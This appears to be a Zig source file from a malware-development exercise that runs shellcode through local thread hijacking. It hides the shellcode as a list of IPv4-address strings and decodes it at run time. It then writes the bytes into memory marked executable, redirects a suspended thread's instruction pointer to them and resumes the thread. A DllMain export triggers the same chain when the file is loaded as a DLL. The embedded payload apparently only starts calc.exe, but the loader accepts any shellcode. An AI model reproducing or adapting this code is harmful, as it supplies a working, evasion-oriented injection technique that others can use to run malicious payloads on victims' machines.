const std = @import("std");
const ipv4Deobfuscation = @import("9.payload-obfuscation-ipv4fuscation.zig").ipv4Deobfuscation;
const win = @import("zigwin32").everything;

// x86
// const CONTEXT_CONTROL = 0x00010001;

// x64
const CONTEXT_CONTROL = 0x00100001;

const THREAD_ALL_ACCESS = win.THREAD_ALL_ACCESS;
const INFINITE = win.INFINITE;
const CONTEXT = win.CONTEXT;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const HANDLE = win.HANDLE;
const THREADENTRY32 = win.THREADENTRY32;
const HINSTANCE = win.HINSTANCE;
const PVOID = *anyopaque;
const BOOL = win.BOOL;

const DLL_PROCESS_ATTACH = win.DLL_PROCESS_ATTACH;
const DLL_THREAD_ATTACH = win.DLL_THREAD_ATTACH;
const DLL_THREAD_DETACH = win.DLL_THREAD_DETACH;
const DLL_PROCESS_DETACH = win.DLL_PROCESS_DETACH;

const CreateToolhelp32Snapshot = win.CreateToolhelp32Snapshot;
const GetCurrentThreadId = win.GetCurrentThreadId;
const GetCurrentProcessId = win.GetCurrentProcessId;
const Thread32First = win.Thread32First;
const Thread32Next = win.Thread32Next;
const OpenThread = win.OpenThread;
const CloseHandle = win.CloseHandle;
const SuspendThread = win.SuspendThread;
const ResumeThread = win.ResumeThread;
const GetLastError = win.GetLastError;
const GetThreadContext = win.GetThreadContext;
const SetThreadContext = win.SetThreadContext;
const WaitForSingleObject = win.WaitForSingleObject;
const VirtualAlloc = win.VirtualAlloc;
const VirtualProtect = win.VirtualProtect;
const CreateThread = win.CreateThread;

const ipv4_array = [_][:0]const u8{ "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0" };

fn getLocalThreadHandle() !HANDLE {
    const current_process_id = GetCurrentProcessId();
    const main_thread_id = GetCurrentThreadId();

    const h_snapshot = CreateToolhelp32Snapshot(.{ .SNAPTHREAD = 1 }, 0) orelse {
        std.debug.print("[!] CreateToolhelp32Snapshot Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateToolhelp32SnapshotFailed;
    };
    defer _ = CloseHandle(h_snapshot);

    var thread_entry: THREADENTRY32 = undefined;
    thread_entry.dwSize = @sizeOf(THREADENTRY32);

    if (Thread32First(h_snapshot, &thread_entry) == 0) {
        std.debug.print("[!] Thread32First Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.Thread32FirstFailed;
    }

    while (Thread32Next(h_snapshot, &thread_entry) != 0) {
        if (thread_entry.th32OwnerProcessID == current_process_id and thread_entry.th32ThreadID != main_thread_id) {
            const h_thread = OpenThread(THREAD_ALL_ACCESS, 0, thread_entry.th32ThreadID) orelse {
                std.debug.print("[!] OpenThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
                return error.OpenThreadFailed;
            };

            return h_thread;
        }
    }

    return error.FailedToGetLocalThreadHandle;
}

fn injectShellcodeToLocalProcess(shellcode: []const u8) !*anyopaque {
    const address = VirtualAlloc(
        null,
        shellcode.len,
        .{ .COMMIT = 1, .RESERVE = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocFailed;
    };
    @memcpy(@as([*]u8, @ptrCast(address)), shellcode);

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtect(
        address,
        shellcode.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectFailed;
    }

    return address;
}

fn hijackThread(h_thread: HANDLE, shellcode_address: *anyopaque) !void {
    var thread_context: CONTEXT = undefined;
    thread_context.ContextFlags = CONTEXT_CONTROL;

    _ = SuspendThread(h_thread);

    if (GetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] GetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetThreadContextFailed;
    }

    // X86
    // thread_context.Eip = @intFromPtr(address);

    // X64
    thread_context.Rip = @intFromPtr(shellcode_address);

    if (SetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] SetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.SetThreadContextFailed;
    }

    _ = ResumeThread(h_thread);

    _ = WaitForSingleObject(h_thread, INFINITE);
}

fn dummyFunction() void {
    var i: u8 = 0;
    while (i < 100) {
        i += 1;
        std.debug.print("We are in the dummy function\n", .{});
        std.time.sleep(std.time.ns_per_s * 2);
    }
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const dummy_thread = CreateThread(
        null,
        0,
        @ptrCast(&dummyFunction),
        null,
        .{},
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };
    defer _ = CloseHandle(dummy_thread);

    const shellcode = try ipv4Deobfuscation(allocator, &ipv4_array);
    defer allocator.free(shellcode);

    const h_thread = try getLocalThreadHandle();
    defer _ = CloseHandle(h_thread);

    const shellcode_address = try injectShellcodeToLocalProcess(shellcode);
    try hijackThread(h_thread, shellcode_address);
}

pub export fn DllMain(hinstDLL: HINSTANCE, fdwReason: u32, lpReserved: PVOID) BOOL {
    _ = lpReserved;
    _ = hinstDLL;
    switch (fdwReason) {
        DLL_PROCESS_ATTACH => {
            main() catch return 0;
        },
        DLL_THREAD_ATTACH => {},
        DLL_THREAD_DETACH => {},
        DLL_PROCESS_DETACH => {},
        else => {},
    }
    return 1;
}
